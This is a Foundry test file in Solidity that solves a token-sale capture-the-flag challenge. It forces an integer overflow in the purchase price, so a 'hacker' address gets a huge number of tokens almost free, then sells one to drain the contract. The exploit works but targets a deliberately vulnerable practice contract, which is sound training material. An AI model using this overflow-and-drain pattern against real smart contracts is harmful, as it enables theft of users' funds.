// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {TokenSaleChallenge} from "src/Math/TokenSale.sol";

contract TokenSaleChallengeTest is Test {
    TokenSaleChallenge public tokenSaleChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);
        tokenSaleChallenge = new TokenSaleChallenge{value: 1 ether}();
    }

    function testTokenSale() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "tokenSaleChallenge balance:",
            address(tokenSaleChallenge).balance
        );

        uint256 val;
        unchecked {
            val = (type(uint256).max / 1 ether + 1) * 1 ether;
        }

        vm.startPrank(hacker);
        tokenSaleChallenge.buy{value: val}(type(uint256).max / 1 ether + 1);

        console.log("my balance after buy:", hacker.balance);
        console.log(
            "challenge balance after buy:",
            address(tokenSaleChallenge).balance
        );

        tokenSaleChallenge.sell(1);
        vm.stopPrank();

        console.log("my final balance:", hacker.balance);
        console.log(
            "challenge final balance:",
            address(tokenSaleChallenge).balance
        );

        assertTrue(tokenSaleChallenge.isComplete());
    }
}